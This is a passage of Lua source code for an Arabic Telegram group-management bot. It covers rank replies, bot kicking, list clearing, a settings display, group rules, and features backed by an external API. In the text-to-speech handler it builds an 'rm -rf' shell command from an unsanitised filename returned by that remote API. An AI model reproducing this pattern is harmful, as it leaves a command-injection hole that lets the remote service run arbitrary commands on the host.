if text and text:match("^تغير رد المدير (.*)$") then
local Text = text:match("^تغير رد المدير (.*)$") 
DevAbd:set(TRON.."Abd:Managers:Rd"..msg.chat_id_,Text) 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المدير الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد الادمن (.*)$") then
local Text = text:match("^تغير رد الادمن (.*)$") 
DevAbd:set(TRON.."Abd:Admins:Rd"..msg.chat_id_,Text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد الادمن الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المميز (.*)$") then
local Text = text:match("^تغير رد المميز (.*)$") 
DevAbd:set(TRON.."Abd:VipMem:Rd"..msg.chat_id_,Text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المميز الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنظف (.*)$") then
local Text = text:match("^تغير رد المنظف (.*)$") 
DevAbd:set(TRON.."Abd:Cleaner:Rd"..msg.chat_id_,Text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنظف الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد العضو (.*)$") then
local Text = text:match("^تغير رد العضو (.*)$") 
DevAbd:set(TRON.."Abd:mem:Rd"..msg.chat_id_,Text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد العضو الى ↫ "..Text, 1, 'md')
end
if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف جميع ردود الرتب", 1, 'md')
DevAbd:del(TRON.."Abd:mem:Rd"..msg.chat_id_)
DevAbd:del(TRON.."Abd:Cleaner:Rd"..msg.chat_id_)
DevAbd:del(TRON.."Abd:VipMem:Rd"..msg.chat_id_)
DevAbd:del(TRON.."Abd:Admins:Rd"..msg.chat_id_)
DevAbd:del(TRON.."Abd:Managers:Rd"..msg.chat_id_)
DevAbd:del(TRON.."Abd:Constructor:Rd"..msg.chat_id_)
DevAbd:del(TRON.."Abd:BasicConstructor:Rd"..msg.chat_id_)
DevAbd:del(TRON.."Abd:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source TRON     --
if text == "كشف البوتات" and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = '⌁︙*قائمة البوتات* ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' ✯'
end
text = text.."~ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتوجد بوتات هنا*", 1, 'md')
return false end
if #admins == i then 
local a = '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙*عدد البوتات هنا* ↫ '..n..'\n'
local f = '⌁︙*عدد البوتات المرفوعه* ↫ '..t..'\n⌁︙*ملاحضه علامة الـ*✯ *تعني ان البوت ادمن في هذه المجموعه*'
Dev_Abd(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end,nil)
end
if text == 'حذف البوتات' and ChCheck(msg) or text == 'طرد البوتات' and ChCheck(msg) or text == 'مسح البوتات' and ChCheck(msg) then
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp)  
local admins = dp.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if dp.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(TRON) then
ChatKick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتوجد بوتات هنا*", 1, 'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*عدد البوتات هنا* ↫ "..c.."\n⌁︙*عدد البوتات المرفوعه* ↫ "..x.."\n⌁︙*تم طرد* ↫ "..(c - x).." *من البوتات*", 1, 'md')
end 
end,nil)  
end 
--     Source TRON     --
end
--     Source TRON     --
if Admin(msg) then
if text and text:match("^حذف (.*)$") or text and text:match("^مسح (.*)$") then
local txts = {string.match(text, "^(حذف) (.*)$")}
local txtss = {string.match(text, "^(مسح) (.*)$")}
if Sudo(msg) then 
if txts[2] == 'الثانويين' or txtss[2] == 'الثانويين' or txts[2] == 'المطورين الثانويين' or txtss[2] == 'المطورين الثانويين' then
DevAbd:del(TRON..'Abd:SecondSudo:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المطورين الثانويين")  
end
end
if SecondSudo(msg) then 
if txts[2] == 'المطورين' or txtss[2] == 'المطورين' then
DevAbd:del(TRON..'Abd:SudoBot:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المطورين")  
end
if txts[2] == 'قائمه العام' or txtss[2] == 'قائمه العام' then
DevAbd:del(TRON..'Abd:BanAll:')
DevAbd:del(TRON..'Abd:MuteAll:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة العام")  
end
end
if SudoBot(msg) then
if txts[2] == 'الادمنيه العامين' or txts[2] == 'الادمنيه العام' or txtss[2] == 'الادمنيه العامين' or txtss[2] == 'الادمنيه العام' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف الادمنيه العامين")  
DevAbd:del(TRON..'Abd:AdminAll:')
end
if txts[2] == 'المميزين عام' or txts[2] == 'المميزين العامين' or txtss[2] == 'المميزين عام' or txtss[2] == 'المميزين العامين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المميزين عام")  
DevAbd:del(TRON..'Abd:VipAll:')
end
if txts[2] == 'المدراء العامين' or txts[2] == 'المدراء العام' or txtss[2] == 'المدراء العامين' or txtss[2] == 'المدراء العام' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المدراء العامين")  
DevAbd:del(TRON..'Abd:ManagerAll:')
end
if txts[2] == 'المالكين' or txtss[2] == 'المالكين' then
DevAbd:del(TRON..'Abd:AbdConstructor:'..msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,dp) 
local admins = dp.members_
for i=0 , #admins do
if dp.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevAbd:sadd(TRON.."Abd:AbdConstructor:"..msg.chat_id_,admins[i].user_id_)
end 
end  
end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المالكين")  
end
end
if AbdConstructor(msg) then
if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المنشئين الاساسيين")  
DevAbd:del(TRON..'Abd:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المنشئين")  
DevAbd:del(TRON..'Abd:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المدراء")  
DevAbd:del(TRON..'Abd:Managers:'..msg.chat_id_)
end 
if txts[2] == 'المنظفين' or txtss[2] == 'المنظفين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المنظفين")  
DevAbd:del(TRON..'Abd:Cleaner:'..msg.chat_id_)
end end
if Manager(msg) then
if txts[2] == 'الادمنيه' or txtss[2] == 'الادمنيه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف الادمنيه")  
DevAbd:del(TRON..'Abd:Admins:'..msg.chat_id_)
end
end
if txts[2] == 'قوانين' or txtss[2] == 'قوانين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف القوانين")  
DevAbd:del(TRON..'Abd:rules'..msg.chat_id_)
end
if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المطايه")  
DevAbd:del(TRON..'User:Donky:'..msg.chat_id_)
end
if txts[2] == 'الرابط' or txtss[2] == 'الرابط' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف رابط المجموعه")  
DevAbd:del(TRON.."Abd:Groups:Links"..msg.chat_id_)
end
if txts[2] == 'المميزين' or txtss[2] == 'المميزين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المميزين")  
DevAbd:del(TRON..'Abd:VipMem:'..msg.chat_id_)
end
if txts[2] == 'المكتومين' or txtss[2] == 'المكتومين' then
DevAbd:del(TRON..'Abd:Muted:'..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المكتومين")  
end
if txts[2] == 'المقيدين' or txtss[2] == 'المقيدين' then     
local List = DevAbd:smembers(TRON..'Abd:Tkeed:'..msg.chat_id_)
for k,v in pairs(List) do   
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevAbd:srem(TRON..'Abd:Tkeed:'..msg.chat_id_, v)
end 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المقيدين")  
end
if txts[2] == 'قائمه المنع' or txtss[2] == 'قائمه المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة المنع")  
DevAbd:del(TRON..'Abd:Filters:'..msg.chat_id_)
end
if txts[2] == 'قوائم المنع' or txtss[2] == 'قوائم المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قوائم المنع")  
DevAbd:del(TRON..'Abd:Filters:'..msg.chat_id_)
DevAbd:del(TRON.."Abd:FilterAnimation"..msg.chat_id_)
DevAbd:del(TRON.."Abd:FilterPhoto"..msg.chat_id_)
DevAbd:del(TRON.."Abd:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'قائمه منع المتحركات' or txtss[2] == 'قائمه منع المتحركات' then     
DevAbd:del(TRON.."Abd:FilterAnimation"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة منع المتحركات")  
end
if txts[2] == 'قائمه منع الصور' or txtss[2] == 'قائمه منع الصور' then     
DevAbd:del(TRON.."Abd:FilterPhoto"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة منع الصور")  
end
if txts[2] == 'قائمه منع الملصقات' or txtss[2] == 'قائمه منع الملصقات' then     
DevAbd:del(TRON.."Abd:FilterSteckr"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة منع الملصقات")  
end
end
end
--     Source TRON     --
if text and text:match("^حذف القوائم$") and ChCheck(msg) or text and text:match("^مسح القوائم$") and ChCheck(msg) then
if not BasicConstructor(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئ الاساسي فقط', 1, 'md')
else
DevAbd:del(TRON..'Abd:Ban:'..msg.chat_id_) DevAbd:del(TRON..'Abd:Admins:'..msg.chat_id_) DevAbd:del(TRON..'User:Donky:'..msg.chat_id_) DevAbd:del(TRON..'Abd:VipMem:'..msg.chat_id_) DevAbd:del(TRON..'Abd:Filters:'..msg.chat_id_) DevAbd:del(TRON..'Abd:Muted:'..msg.chat_id_)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف ↫ ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • المطايه ❩ بنجاح \n ✓", 1, 'md')
end end
--     Source TRON     --
if text and text:match("^حذف جميع الرتب$") and ChCheck(msg) or text and text:match("^مسح جميع الرتب$") and ChCheck(msg) or text and text:match("^تنزيل جميع الرتب$") and ChCheck(msg) then
if not AbdConstructor(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمالكين فقط', 1, 'md')
else
local basicconstructor = DevAbd:smembers(TRON..'Abd:BasicConstructor:'..msg.chat_id_)
local constructor = DevAbd:smembers(TRON..'Abd:Constructor:'..msg.chat_id_)
local Managers = DevAbd:smembers(TRON..'Abd:Managers:'..msg.chat_id_)
local admins = DevAbd:smembers(TRON..'Abd:Admins:'..msg.chat_id_)
local vipmem = DevAbd:smembers(TRON..'Abd:VipMem:'..msg.chat_id_)
local donky = DevAbd:smembers(TRON..'User:Donky:'..msg.chat_id_)
if #basicconstructor ~= 0 then basicconstructort = 'المنشئين الاساسيين • ' else basicconstructort = '' end
if #constructor ~= 0 then constructort = 'المنشئين • ' else constructort = '' end
if #Managers ~= 0 then Managerst = 'المدراء • ' else Managerst = '' end
if #admins ~= 0 then adminst = 'الادمنيه • ' else adminst = '' end
if #vipmem ~= 0 then vipmemt = 'المميزين • ' else vipmemt = '' end
if #donky ~= 0 then donkyt = 'المطايه • ' else donkyt = '' end
if #basicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
DevAbd:del(TRON..'Abd:BasicConstructor:'..msg.chat_id_)
DevAbd:del(TRON..'Abd:Constructor:'..msg.chat_id_)
DevAbd:del(TRON..'Abd:Managers:'..msg.chat_id_)
DevAbd:del(TRON..'Abd:Admins:'..msg.chat_id_)
DevAbd:del(TRON..'Abd:VipMem:'..msg.chat_id_)
DevAbd:del(TRON..'User:Donky:'..msg.chat_id_)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف جميع الرتب التاليه ↫ ❨ "..basicconstructort..constructort..Managerst..adminst..vipmemt..donkyt.." ❩ بنجاح \n ✓", 1, 'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد رتب هنا", 1, 'md')
end 
end 
end
--     Source TRON     --
if Admin(msg) then 
if text and text:match("^الاعدادات$") and ChCheck(msg) then
if not DevAbd:get(TRON..'Abd:Spam:Text'..msg.chat_id_) then
spam_c = 400
else
spam_c = DevAbd:get(TRON..'Abd:Spam:Text'..msg.chat_id_)
end
--     Source TRON     --
if DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source TRON     --
if DevAbd:get(TRON.."Abd:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevAbd:get(TRON.."Abd:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevAbd:get(TRON.."Abd:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source TRON     --
if DevAbd:get(TRON..'Abd:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevAbd:get(TRON..'Abd:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevAbd:get(TRON.."Abd:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevAbd:get(TRON..'Abd:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevAbd:get(TRON..'Abd:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevAbd:get(TRON..'Abd:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevAbd:get(TRON..'Abd:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source TRON     --
local TXTE = "⌁︙اعدادات المجموعه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
.."⌁︙الروابط ↫ "..mute_links.."\n"
.."⌁︙المعرف ↫ "..lock_tag.."\n"
.."⌁︙البوتات ↫ "..lock_bots.."\n"
.."⌁︙المتحركه ↫ "..mute_gifs.."\n"
.."⌁︙الملصقات ↫ "..lock_sticker.."\n"
.."⌁︙الملفات ↫ "..lock_file.."\n"
.."⌁︙الصور ↫ "..mute_photo.."\n"
.."⌁︙الفيديو ↫ "..mute_video.."\n"
.."⌁︙الاونلاين ↫ "..mute_in.."\n"
.."⌁︙الدردشه ↫ "..mute_text.."\n"
.."⌁︙التوجيه ↫ "..lock_forward.."\n"
.."⌁︙الاغاني ↫ "..mute_music.."\n"
.."⌁︙الصوت ↫ "..mute_voice.."\n"
.."⌁︙الجهات ↫ "..lock_contact.."\n"
.."⌁︙الماركداون ↫ "..markdown.."\n"
.."⌁︙الهاشتاك ↫ "..lock_htag.."\n"
.."⌁︙التعديل ↫ "..mute_edit.."\n"
.."⌁︙التثبيت ↫ "..lock_pin.."\n"
.."⌁︙الاشعارات ↫ "..lock_tgservice.."\n"
.."⌁︙الكلايش ↫ "..lock_spam.."\n"
.."⌁︙الدخول ↫ "..lock_Join.."\n"
.."⌁︙الشبكات ↫ "..lock_wp.."\n"
.."⌁︙المواقع ↫ "..lock_location.."\n"
.."⌁︙الفشار ↫ "..lock_fshar.."\n"
.."⌁︙الكفر ↫ "..lock_kaf.."\n"
.."⌁︙الطائفيه ↫ "..lock_taf.."\n"
.."⌁︙العربيه ↫ "..lock_arabic.."\n"
.."⌁︙الانكليزيه ↫ "..lock_english.."\n"
.."⌁︙الفارسيه ↫ "..lock_farsi.."\n"
.."⌁︙التكرار ↫ "..flood.."\n"
.."⌁︙عدد التكرار ↫ "..Flood_Num.."\n"
.."⌁︙عدد السبام ↫ "..spam_c.."\n"
.."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙[Source Channel](https://t.me/YYYYAX)\n"
Dev_Abd(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
end
end
--     Source TRON     --
if text and text:match("^كول (.*)$") then
local txt = {string.match(text, "^(كول) (.*)$")}
Dev_Abd(msg.chat_id_,0, 1, txt[2], 1, 'md')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
--     Source TRON     --
if DevAbd:get(TRON..'Abd:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevAbd:del(TRON..'Abd:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAbd:del(TRON..'Abd:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbd:set(TRON..'Abd:rules'..msg.chat_id_,text)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ قوانين المجموعه', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي القوانين الان', 1, 'md')
DevAbd:set(TRON..'Abd:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") then
local rules = DevAbd:get(TRON..'Abd:rules'..msg.chat_id_)
Dev_Abd(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
--     Source TRON     --
if text == 'رقمي' and SourceCh(msg) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.phone_number_  then
MyNumber = "⌁︙رقمك ↫ +"..result.phone_number_
else
MyNumber = "⌁︙رقمك موضوع لجهات اتصالك فقط"
end
send(msg.chat_id_, msg.id_,MyNumber)
end,nil)
end
--     Source TRON     --
if text == "تفعيل انطق" and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل ميزة انطق'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Antk:Abd'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل ميزة انطق'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Antk:Abd'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevAbd:get(TRON..'Abd:Antk:Abd'..msg.chat_id_) and SourceCh(msg) then
local UrlAntk = https.request('https://apiAbd.ml/Antk.php?Abd='..URL.escape(text:match("^انطق (.*)$")))
Antk = JSON.decode(UrlAntk)
if UrlAntk.ok ~= false then
download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..Antk.result.translate..'.mp3')  
os.execute('rm -rf ./'..Antk.result.translate..'.mp3') 
end
end
--     Source TRON     --
if text == "تفعيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل الزخرفه بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Zrf:Abd'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل الزخرفه بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Zrf:Abd'..msg.chat_id_,true)  
end
if DevAbd:get(TRON..'Zrf:Abd'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر الزخرفه', 1, 'md')
DevAbd:del(TRON..'Zrf:Abd'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiAbd.ml/zrf.php?Abd='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "⌁︙قائمة الزخرفه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, t, 1, 'md')
DevAbd:del(TRON..'Zrf:Abd'..msg.chat_id_..msg.sender_user_id_)
return false   
end
if not DevAbd:get(TRON..'Abd:Zrf:Abd'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevAbd:setex(TRON.."Zrf:Abd"..msg.chat_id_..msg.sender_user_id_,300,true)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الكلمه لزخرفتها \nيمكنك الزخرفة باللغه { en } ~ { ar } ', 1, 'md')
end
end
if not DevAbd:get(TRON..'Abd:Zrf:Abd'..msg.chat_id_) then
if text and text:match("^زخرفه (.*)$") and SourceCh(msg) or text and text:match("^زخرف (.*)$") and SourceCh(msg) then 
local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
UrlZrf = https.request('https://apiAbd.ml/zrf.php?Abd='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "⌁︙قائمة الزخرفه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
end
--     Source TRON     --
if text == "تفعيل الابراج" and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل الابراج بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Brg:Abd'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل الابراج بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Brg:Abd'..msg.chat_id_,true)  
end
if not DevAbd:get(TRON..'Abd:Brg:Abd'..msg.chat_id_) then
if text and text:match("^برج (.*)$") and SourceCh(msg) or text and text:match("^برجي (.*)$") and SourceCh(msg) then 
local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
UrlBrg = https.request('https://apiAbd.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.Abd  
